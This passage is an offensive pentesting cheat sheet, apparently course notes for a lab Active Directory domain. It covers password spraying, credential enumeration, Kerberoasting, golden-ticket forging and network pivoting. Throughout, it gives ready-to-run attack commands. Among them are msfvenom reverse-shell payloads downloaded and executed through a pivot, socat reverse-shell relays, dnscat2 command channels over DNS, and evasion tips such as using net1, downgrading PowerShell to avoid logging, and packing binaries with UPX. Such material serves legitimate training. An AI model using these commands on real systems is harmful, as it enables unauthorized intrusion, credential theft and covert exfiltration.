Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version
.\Inveigh.exe
# Press Escape to get to console
# GET NTLMV2UNIQUE — view unique hashes
# GET NTLMV2USERNAMES — view collected usernames
```

## 8.4 Password Policy Enumeration

### With Credentials (Linux)
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### Without Credentials — SMB Null Session
```bash
rpcclient -U "" -N 172.16.5.5
$> querydominfo

enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.255 -oA ilfreight
```

### LDAP Anonymous Bind
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### From Windows
```powershell
net accounts
import-module .\PowerView.ps1
Get-DomainPolicy
```

### Null Session from Windows
```cmd
net use \\host\ipc$ "" /u:""
```

## 8.5 User List Generation

### SMB Null Session
```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N 172.16.5.5
$> enumdomusers

nxc smb 172.16.5.5 --users
```

### LDAP Anonymous Bind
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

### Kerbrute User Enumeration
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

### Credentialed Enumeration
```bash
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

## 8.6 Password Spraying

### From Linux
```bash
# Kerbrute (stealthiest — no Event ID 4625)
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# CrackMapExec (filter successful logins)
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

# rpcclient (one-liner)
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

### From Windows
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
> When domain-joined, the tool auto-generates the user list from AD and excludes accounts near lockout.

### Local Admin Spraying
```bash
# WARNING: Always use --local-auth to prevent domain-wide lockouts
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### Password Pattern Reuse
| Scenario | Action |
|----------|--------|
| Local admin `$desktop%@admin123` cracked | Try `$server%@admin123` on servers |
| Domain user `ajones` password found | Try `ajones_adm` admin account |
| NTLM hash from local SAM | Spray across subnet with `--local-auth` |
| Domain trust environments | Credentials from Domain A may work in Domain B |

## 8.7 Security Control Enumeration

### Windows Defender
```powershell
Get-MpComputerStatus
```
Key fields: `RealTimeProtectionEnabled`, `AntivirusEnabled`, `BehaviorMonitorEnabled`

### AppLocker
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
Look for: Alternate PowerShell paths that are not blocked (`SysWOW64\WindowsPowerShell\v1.0\powershell.exe`, `PowerShell_ISE.exe`)

### PowerShell Constrained Language Mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```
Values: `FullLanguage` (no restrictions) or `ConstrainedLanguage` (heavy restrictions)

### LAPS (Local Administrator Password Solution)
```powershell
# Find who can read LAPS passwords
Find-LAPSDelegatedGroups

# Find users with "All Extended Rights"
Find-AdmPwdExtendedRights

# Read LAPS passwords (if you have access)
Get-LAPSComputers
```

## 8.8 Credential Enumeration — From Linux

### CrackMapExec
```bash
# User enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# Group enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# Logged-on users
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# Share enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Spider shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
# Results written to /tmp/cme_spider_plus/<ip>
```

### SMBMap
```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

### Impacket — Remote Execution
```bash
# psexec.py (requires local admin) — uploads executable to ADMIN$
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

# wmiexec.py — no file drop, fewer logs (uses WMI)
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

### windapsearch
```bash
# Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Privileged Users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### BloodHound.py (Linux Collector)
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

Output generates JSON files: `<timestamp>_computers.json`, `<timestamp>_domains.json`, `<timestamp>_groups.json`, `<timestamp>_users.json`

### BloodHound GUI Setup
```bash
# Start Neo4j
sudo neo4j start

# Launch BloodHound
bloodhound
# Default: neo4j / HTB_@cademy_stdnt!

# Zip data for upload
zip -r ilfreight_bh.zip *.json
```

## 8.9 Credential Enumeration — From Windows

### ActiveDirectory PowerShell Module
```powershell
Import-Module ActiveDirectory

# Domain info
Get-ADDomain

# Find accounts with SPNs (Kerberoasting candidates)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Trust relationships
Get-ADTrust -Filter *

# Group enumeration
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView
```powershell
Import-Module .\PowerView.ps1

# Domain user info
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Recursive group membership
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust enumeration
Get-DomainTrustMapping

# Test local admin access
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

# Find users with SPNs
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

### SharpView (C# port of PowerView)
```cmd
.\SharpView.exe Get-DomainUser -Identity forend
```

### SharpHound (BloodHound Collector — Windows)
```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### Snaffler (Credential Hunting)
```cmd
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

## 8.10 Living Off The Land — AD Enumeration

### dsquery + LDAP Filtering
```powershell
# All objects in a container
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

# Users with PASSWD_NOTREQD (UAC flag = 32)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Find Domain Controllers (UAC flag = 8192)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

# Users with password never expires (65536)
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" -attr sAMAccountName

# Disabled accounts (2)
dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr sAMAccountName
```

### LDAP Filter Syntax Reference

| OID Rule | Name | Behaviour |
|----------|------|-----------|
| `1.2.840.113556.1.4.803` | LDAP_MATCHING_RULE_BIT_AND | ALL specified bits must be set |
| `1.2.840.113556.1.4.804` | LDAP_MATCHING_RULE_BIT_OR | ANY of the specified bits can be set |
| `1.2.840.113556.1.4.1941` | LDAP_MATCHING_RULE_IN_CHAIN | Recursive DN search (nested groups) |

### Key UAC Bitmask Values
| Decimal | Flag | Meaning |
|---------|------|---------|
| 2 | ACCOUNTDISABLE | Account disabled |
| 32 | PASSWD_NOTREQD | No password required |
| 64 | PASSWD_CANT_CHANGE | User can't change password |
| 512 | NORMAL_ACCOUNT | Standard user account |
| 8192 | SERVER_TRUST_ACCOUNT | Object is a Domain Controller |
| 65536 | DONT_EXPIRE_PASSWORD | Password never expires |

### Net Commands Reference
```cmd
net accounts                    # password requirements
net accounts /domain            # domain password & lockout policy
net group /domain               # domain groups
net group "Domain Admins" /domain  # DA members
net group "domain computers" /domain  # domain PCs
net group "Domain Controllers" /domain  # DCs
net localgroup administrators /domain  # domain admins in local admin
net user /domain                # all domain users
net user <username> /domain     # specific user info
net view                        # list computers
net view /domain                # PCs in domain
net share                       # current shares
```

> **Tip:** Typing `net1` instead of `net` may bypass string-based detection.

### Environmental Reconnaissance Commands
| Command | Result |
|---------|--------|
| `hostname` | PC name |
| `[System.Environment]::OSVersion.Version` | OS version |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patches/hotfixes |
| `ipconfig /all` | Network adapter configuration |
| `echo %USERDOMAIN%` | Domain name |
| `echo %logonserver%` | Domain controller name |
| `qwinsta` | Logged-on users |

### Firewall & AV Checks
```powershell
# Firewall status
netsh advfirewall show allprofiles

# Windows Defender (CMD)
sc query windefend

# Windows Defender (PowerShell)
Get-MpComputerStatus

# PowerShell downgrade (may avoid logging)
powershell.exe -version 2
```

## 8.11 Kerberoasting

### How It Works
1. Find accounts with SPNs (Service Principal Names)
2. Request a Kerberos TGS ticket for that account
3. The ticket is encrypted with the account's NTLM hash
4. Crack the ticket offline with Hashcat

### From Linux — GetUserSPNs.py
```bash
# List SPN accounts
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request all TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Request single ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Crack offline
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

# Validate cracked credentials
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

### Additional Impacket AD Tools
```bash
# SID Brute Force User Enumeration (no share access needed)
impacket-lookupsid.py DOMAIN/user:pass@DC_IP

# Golden Ticket Creation & Customization
impacket-ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain DOMAIN -user-id 500 Administrator

# Child-to-Parent Domain Privilege Escalation
impacket-raiseChild.py DOMAIN/Administrator:pass@PARENT_DC

# AD DNS Record Enumeration/Dumping
adidnsdump -u DOMAIN\\user -p pass ldap://DC_IP

# GPP Password Decryption
gpp-decrypt "password_from_GPP.xml"
```

---

# Phase 9: Pivoting, Tunneling & Port Forwarding

## 9.1 Concepts

- **Pivoting:** Moving through a compromised host to reach other network segments
- **Tunneling:** Encapsulating traffic within another protocol to route through restricted networks
- **Port Forwarding:** Redirecting traffic from one port to another

## 9.2 SSH-Based Pivoting

### Dynamic Port Forwarding (SOCKS Proxy)
```bash
ssh -D 9050 ubuntu@10.129.202.64
```

**Configure proxychains:** Add `socks4 127.0.0.1 9050` to the **last line** of `/etc/proxychains.conf`:
```
socks4 127.0.0.1 9050
```

> **Troubleshooting:** Depending on the SOCKS server version, you may need to change `socks4` to `socks5` in proxychains.conf.

Usage:
```bash
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19    # MUST use -sT (full TCP connect scan)
proxychains msfconsole
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore
```

> **Critical:** Only full TCP connect scans (`-sT`) work through proxychains. Half-connect/syn scans (`-sS`) send partial packets and will return **incorrect results**.
>
> **Note:** xfreerdp will require you to accept an RDP certificate before the session establishes.

### Remote (Reverse) Port Forwarding with SSH
Use when the target **cannot route back** to your attack machine directly.

```bash
# On the pivot host — forward port 8080 to attacker's port 8000
ssh -R <pivot_ip>:8080:0.0.0.0:8000 ubuntu@<target_ip> -vN
# -v: verbose, -N: no remote command execution
```

**Traffic flow:** `Windows Target -> Pivot:8080 -> SSH Tunnel -> Attacker:8000`

**When to use this instead of RDP:**
- RDP clipboard is disabled (can't upload/download files)
- You need to run exploits or use low-level Windows API
- You need Meterpreter enumeration that built-in Windows tools can't do

**Full workflow example:**
1. Generate payload with LHOST = pivot IP: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080`
2. Transfer payload to pivot via SCP: `scp backupscript.exe ubuntu@<pivot_ip>:~/`
3. Start HTTP server on pivot: `python3 -m http.server 8123`
4. Windows target downloads payload: `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`
5. Start MSF listener on attacker at port 8000
6. Execute payload on Windows target → Meterpreter session through pivot

### sshuttle (VPN-like, no proxychains needed)
```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```
> Creates iptables rules — all traffic to the target subnet routes through the pivot automatically. No proxychains configuration needed. Only works over SSH.

### Windows — Plink.exe + Proxifier
```cmd
# Plink (PuTTY Link) — SSH SOCKS tunnel from Windows
plink -ssh -D 9050 ubuntu@10.129.15.50
```

**Proxifier Configuration (Windows):**
> Proxifier creates a tunneled network for desktop client applications, routing them through a SOCKS or HTTPS proxy with proxy chaining support.

1. Open Proxifier → Profile → Proxy Servers → Add
2. Configure: Address `127.0.0.1`, Port `9050`, Protocol `SOCKS Version 5`
3. Profile → Proxyfication Rules → Add rule for target subnet
4. Now any application (mstsc.exe, browser, etc.) routes through the Plink SOCKS tunnel

After configuring, launch `mstsc.exe` directly — Proxifier routes the RDP traffic through `127.0.0.1:9050` to the pivot host.

## 9.3 Meterpreter Pivoting

### AutoRoute + SOCKS Proxy
```bash
# In Metasploit
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Configure SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

From Meterpreter session directly:
```
meterpreter > run autoroute -s 172.16.5.0/23
meterpreter > run autoroute -p    # list routes
```

### Port Forwarding via Meterpreter
```
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
Then: `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`

### Meterpreter Reverse Port Forwarding
```
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
Payload LHOST = pivot host IP, LPORT = 1234. Listener on attacker at port 8081.

## 9.4 Socat Redirection

> **Socat** is a bidirectional relay tool that creates pipe sockets between 2 independent network channels without needing SSH tunneling. It listens on one host/port and forwards all data to another IP/port.

### Reverse Shell via Socat
```bash
# Pivot — socat acts as relay: listens on 8080, forwards to attacker's port 80
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Payload LHOST = pivot IP, LPORT = 8080
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Attacker — MSF listener on port 80
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```

### Bind Shell via Socat
```bash
# Pivot — socat relays incoming connections to Windows target's bind port
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Attacker connects to pivot (Metasploit handler)
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set rhost 10.129.202.64    # pivot IP
set LPORT 8080
run
```

## 9.5 Chisel (SOCKS5 over HTTP/SSH)

> **Warning:** Depending on the glibc library version on target vs. workstation, you may get errors. If this happens, compare library versions or use an older prebuilt chisel from the GitHub Releases section.

### Forward Mode
```bash
# Server on pivot
./chisel server -v -p 1234 --socks5

# Client on attacker
./chisel client -v 10.129.202.64:1234 socks
```
Chisel starts a SOCKS proxy on `127.0.0.1:1080`. Configure proxychains: `socks4 127.0.0.1 1080`

### Reverse Mode
```bash
# Server on attacker (enable --reverse for remote port forwarding)
sudo ./chisel server --reverse -v -p 1234 --socks5

# Client on pivot (R: prefix denotes reversed)
./chisel client -v 10.10.15.176:1234 R:socks
```

### Binary Size Reduction (Evasion)
```bash
go build -ldflags=" -s -w"    # strip debug info and dwarf data
upx brute chisel               # compress binary
du -hs <filename>              # check file size
```

## 9.6 Ligolo-ng (Advanced Multi-Hop Pivoting)

### Setup
```bash
# Create TUN interface (run once per session)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ip addr show ligolo    # verify interface is up

# Start proxy (bind to all interfaces on default port 11601)
sudo ./proxy -selfcert
# Or bind to specific interface/port:
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

### Agent Deployment (Linux)
```bash
# Transfer agent to pivot (via any method: HTTP, SCP, etc.)
wget http://<attacker>:8123/agent
chmod +x agent

# Run agent on pivot
./agent -connect <attacker_ip>:11601 -ignore-cert
```

### Agent Deployment (Windows)
```cmd
# Transfer agent.exe to Windows pivot (via HTTP, SMB, RDP drive, etc.)
# Run from Windows pivot:
C:\Users\mlefay\AppData\Local\Temp\agent.exe -connect <attacker_ip>:11601 -ignore-cert
```

### Activate Session
```
# In ligolo-proxy interface
session           # list sessions
1                 # select session number
start --tun ligolo

# In new terminal — add route for the discovered subnet
sudo ip route add 172.16.5.0/24 dev ligolo

# Verify connectivity
nmap -Pn -p 22 172.16.5.10
```

### Multi-Hop Pivoting (Chain Through Multiple Networks)
```bash
# Attack host — create new TUN interface for each new network
sudo ip tuntap add user kali mode tun ligolo-double
sudo ip link set ligolo-double up

# On ligolo-proxy — on the FIRST pivot session, add a listener
listener_add -addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list    # confirm listener is active

# On SECOND pivot host — connect to FIRST pivot's forwarded port
./agent -connect <first_pivot_ip>:11601 -ignore-cert

# Back in ligolo-proxy — new agent appears, switch to it
session
2
start --tun ligolo-double

# Add route for the newly discovered subnet
sudo ip route add 172.16.6.0/24 dev ligolo-double
```

> **Pattern:** Repeat this process for each new network hop. Create a new TUN interface → add listener on previous pivot → deploy agent on new pivot → route traffic through new TUN.

## 9.7 DNS Tunneling — dnscat2

> **How it works:** In corporate AD environments, local DNS servers resolve hostnames or forward requests externally. dnscat2 exploits this by requesting addresses from an attacker-controlled external server, embedding data inside DNS queries disguised as legitimate lookup traffic.
>
> **Stealth advantage:** Effectively bypasses firewalls and deep packet inspection (DPI) that typically focus on stripping/sniffing HTTPS connections. Data travels inside TXT records within the DNS protocol via an encrypted C2 channel.

### Server Setup (Attacker)
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler && sudo bundle install

# Start server — note the secret key it generates (needed for client)
sudo ruby dnscat2.rb --dns host=10.10.15.141,port=53,domain=inlanefreight.local --no-cache
```

### Client Deployment (Windows Target)
```bash
# Get the PowerShell client
git clone https://github.com/lukebaggett/dnscat2-powershell.git
# Transfer dnscat2.ps1 to target via any method
```

```powershell
Import-Module .\dnscat2.ps1
# Use the secret key from the server output for -PreSharedSecret
Start-Dnscat2 -DNSserver 10.10.15.141 -Domain inlanefreight.local -PreSharedSecret <secret_key_from_server> -Exec cmd

# Interact with established session
window -i 1
```

> **Workflow:** Server generates secret key → key is passed to client → client authenticates and encrypts all data sent through the DNS tunnel.

## 9.8 ICMP Tunneling — ptunnel-ng

> **Precondition:** ICMP tunneling only works when ping responses (echo request/reply) are permitted within the firewalled network. Traffic is encapsulated within ICMP packets.

```bash
# Build on both attacker and pivot
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/
sudo ./autogen.sh

# Alternative — build static binary (avoids library dependency issues)
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# Transfer to pivot
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Server on pivot (-r = relay IP, -R = relay port)
# -r should be the IP of the jump-box reachable from our attack host
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Client on attacker (-p = ping target, -l = local port, -r = relay IP, -R = relay port)
# Must connect through local port 2222 (-l2222) to send traffic through the ICMP tunnel
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# SSH through the ICMP tunnel
ssh -p2222 -lubuntu 127.0.0.1

# Chain: ICMP tunnel → SSH dynamic forwarding → SOCKS proxy → proxychains
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

> **Layering concept:** ptunnel-ng creates the ICMP tunnel (layer 1) → SSH runs through it on port 2222 (layer 2) → SSH dynamic forwarding creates SOCKS proxy on 9050 (layer 3) → proxychains routes tool traffic through the entire chain (layer 4).

## 9.9 SocksOverRDP (Windows-Only Pivoting via RDP)

> **When to use:** Restricted to a Windows-only environment where SSH tunnels are unavailable. Uses Windows RDS **Dynamic Virtual Channels (DVC)** — a feature that allows custom application data to be embedded inside an RDP stream — to carry SOCKS5 traffic transparently.

### Tools Required
| Tool | Purpose |
|------|---------|
| `SocksOverRDP-Plugin.dll` | Loaded into RDP client on attack machine; intercepts/tunnels traffic via `regsvr32` (COM DLL registration hooks plugin into RDP client) |
| `SocksOverRDP-Server.exe` | Deployed on pivot target; receives tunneled traffic and routes onward |
| **Proxifier (portable)** | Forces all outbound traffic through `127.0.0.1:1080` on attack machine |
| `mstsc.exe` | Windows RDP client — carries the SOCKS tunnel transparently |

### Step-by-Step
1. **Register plugin on attacker (COM DLL registration):**
   ```cmd
   regsvr32.exe SocksOverRDP-Plugin.dll
   ```
   > Popup confirms plugin enabled, listening on `127.0.0.1:1080`.

2. **RDP to pivot host:**
   ```cmd
   mstsc.exe   # connect to 172.16.5.19 as victor
   ```
   > Plugin auto-loads — RDP session now carries SOCKS tunnel.

3. **Deploy server on pivot (as Administrator):**
   Transfer `SocksOverRDP-Server.exe` → run with Admin privileges.
   Verify: `netstat -antb | findstr 1080`

4. **Configure Proxifier on attacker:**
   Forward **all** traffic through `127.0.0.1:1080`. Now any tool (not just RDP) routes through the tunnel.

### Full Traffic Flow
```
Your tool (nmap, mstsc, etc.)
  → Proxifier intercepts all outbound traffic
  → Sends to 127.0.0.1:1080
  → SocksOverRDP Plugin tunnels it over RDP session (via DVC)
  → SocksOverRDP-Server.exe on pivot receives it
  → Routes onward to internal target (e.g., 172.16.6.155)
```

> **Performance tip:** In mstsc.exe → Experience tab → set Performance to "Modem" for better multi-session performance.

## 9.10 Windows Netsh Port Forwarding

> **Netsh** is a Windows command-line utility for network configuration. Beyond port forwarding, it can also: find routes, view firewall configuration, and add proxies.

```cmd
# Add port forwarding rule (v4 to v4)
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19

# Verify configured rules
netsh.exe interface portproxy show v4tov4

# After configuring, connect through the pivot
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123 /cert:ignore
```
> The Windows host routes incoming traffic on port 8080 to the internal target's port 3389 automatically.

## 9.11 Rpivot (HTTP-based Reverse SOCKS)

```bash
# Clone and setup
git clone https://github.com/klsecservices/rpivot.git
sudo apt install python2.7

# Server on attacker
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transfer rpivot to pivot
scp -r rpivot ubuntu@<pivot_ip>:/home/ubuntu/

# Client on pivot
python2.7 client.py --server-ip 10.10.15.141 --server-port 9999

# Use through proxychains (proxychains.conf: socks4 127.0.0.1 9050)
proxychains firefox-esr 172.16.5.135:80

# With NTLM proxy authentication (for corporate HTTP proxies)
python client.py --server-ip <proxy_ip> --server-port 8080 --ntlm-proxy-ip <ntlm_proxy_ip> --ntlm-proxy-port 8081 --domain <domain> --username <user> --password <pass>
```

## 9.12 Network Discovery from Pivot Hosts

### Linux Ping Sweep
```bash
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

### Windows CMD Ping Sweep
```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### PowerShell Ping Sweep
```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

### Metasploit Ping Sweep
```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

> **Note:** Attempt ping sweep at least twice — ARP cache may need time to build.


---

## SUPPLEMENTARY: Pivoting — Advanced Reference

# ADDENDUM 04: Pivoting, Tunneling & Port Forwarding — Advanced

## Lateral Movement vs Pivoting vs Tunneling
| Concept | Definition | Example |
|---------|-----------|---------|
| **Lateral Movement** | Spreading WIDE within same network | Host to host on 10.129.x.0/24 |
| **Pivoting** | Crossing network BOUNDARIES | DMZ → internal AD DC |
| **Tunneling** | Obfuscating/encapsulating traffic | SSH inside DNS or ICMP |

## First Steps on New Host
1. **Check privilege level** → `whoami` / `id`
2. **Check network connections** → `ipconfig` / `ifconfig` → look for additional NICs
3. **Check for VPN/remote access software** → look for virtual adapters

**If additional NIC → new subnet → MUST pivot**

## Network Diagramming
Use **Draw.io (diagrams.net)** throughout engagement. Document every host, subnet, and pivot path.

## NAT + SOCKS
SOCKS proxies CAN pivot from NAT networks. Receiving host sees pivot host IP, not attacker IP.

## SOCKS4 vs SOCKS5
| Feature | SOCKS4 | SOCKS5 |
|---------|--------|--------|
| Auth | No | Yes |
| UDP | No | Yes |
| IPv6 | No | Yes |
If proxychains fails with SOCKS4, try SOCKS5 in proxychains.conf.

## dnscat2 Complete Reference
```bash
# Server (authoritative DNS mode)
sudo ruby dnscat2.rb --dns host=IP,port=53,domain=tunnel.dom --no-cache

# Server (direct mode — without domain)
sudo ruby dnscat2.rb --dns server=IP,port=53 --secret=SECRET

# Client Linux
./dnscat --dns server=IP,port=53 --secret=SECRET

# Client Windows PowerShell
Start-Dnscat2 -DNSserver IP -Domain dom -PreSharedSecret SECRET -Exec cmd

# Interact
dnscat2> windows           # List sessions
dnscat2> window -i 1       # Interact with session 1
# Ctrl+Z to return to main console

# Console commands: echo, help, kill, quit, set, start, stop, tunnels, unset, window, windows
# Options: auto_attach, history_size
```

## rpivot Complete Reference
```bash
# Server
sudo python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Client (basic)
python2.7 client.py --server-ip IP --server-port 9999

# Client (NTLM proxy auth)
python client.py --server-ip IP --ntlm-proxy-ip PROXY --ntlm-proxy-port 8080 --domain DOM --user USER --pass PASS

# Usage
proxychains firefox-esr 172.16.5.135:80

# Transfer
scp -r rpivot ubuntu@PIVOT:/home/ubuntu/

# Python 2.7 via pyenv
pyenv install 2.7 && pyenv shell 2.7
```

## ptunnel-ng Complete Reference
```bash
# Build static binary
sed -i '$s/.*/LDFLAGS=-static .\/configure/' autogen.sh
sudo ./autogen.sh
make

# Server (destination host)
sudo ./ptunnel-ng -r DEST -R PORT
# Drops privileges after init

# Client (pivot host)
sudo ./ptunnel-ng -p PIVOT -l LOCAL_PORT -r DEST -R PORT
# Then: ssh -D 9050 -p LOCAL_PORT -l user 127.0.0.1

# Stats: I/O: 0.00/0.00 mb  ICMP I/O/R: 248/22/0  Loss: 0.0%
# Wireshark: Without tunnel=TCP/SSHv2, With tunnel=ICMP Echo Request/Reply
```

## SocksOverRDP
- Uses **Dynamic Virtual Channels (DVC)** — same tech as clipboard/audio sharing
- Setup: `regsvr32.exe SocksOverRDP-Plugin.dll`
- Verify: `netstat -antb | findstr 1080` → should show LISTENING on 127.0.0.1:1080
- Use **ProxifierPE.zip** (portable edition)
- Profile → Proxy Servers → Add → 127.0.0.1:1080 SOCKS4/5

## sshuttle Details
```bash
sshuttle -r user@PIVOT 172.16.5.0/23  # Basic
sshuttle -r user@PIVOT 172.16.5.0/23 --dns  # Include DNS

# Limitations:
# UDP: off (not available with nat method)
# DNS: available with --dns flag

# Persistent: sudo apt install autossh
# Creates iptables/ip6tables rules for sshuttle chain
# Shows Python versions on connection
```

## Meterpreter Ping Sweep
```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

# Linux for-loop
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Windows CMD
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Windows PowerShell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

# WARNING: Run at least twice for ARP cache build
```

## Meterpreter Autoroute (Deprecated)
```bash
# Legacy (shows deprecation notice)
run autoroute -s 172.16.5.0/23
run autoroute -p  # List routes

# Modern
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
set NETMASK 255.255.254.0
run
```

## Portfwd Help
```bash
meterpreter > help portfwd
# Options: -i (index), -l (local port), -L (local host), -p (remote port), -r (remote host), -R (remote forward)
```

## SSH Forward Verification
```bash
netstat -antp | grep 1234
nmap -v -sV -p1234 localhost
```

## Netstat for Defensive Analysis
Can view established sessions, identify suspicious connections, discover management interfaces.

## Windows Firewall Blocks ICMP
Windows Defender blocks ICMP by default. Affects ping sweeps through proxychains → use TCP-based discovery (`nmap -sT`).

## Detection & Prevention
**Baseline:** DNS records, network device backups, DHCP configs, app inventory, host list, dual-homed hosts, network diagrams
**Tools:** Netbrain, diagrams.net
**Beaconing detection:** Regular intervals = C2
**Non-standard port detection:** Port 444 vs 443 suspicious

### MITRE ATT&CK Mapping
| MITRE | Tactic | Technique |
|-------|--------|-----------|
| T1133 | Initial Access | External Remote Services |
| T1021 | Lateral Movement | Remote Services |
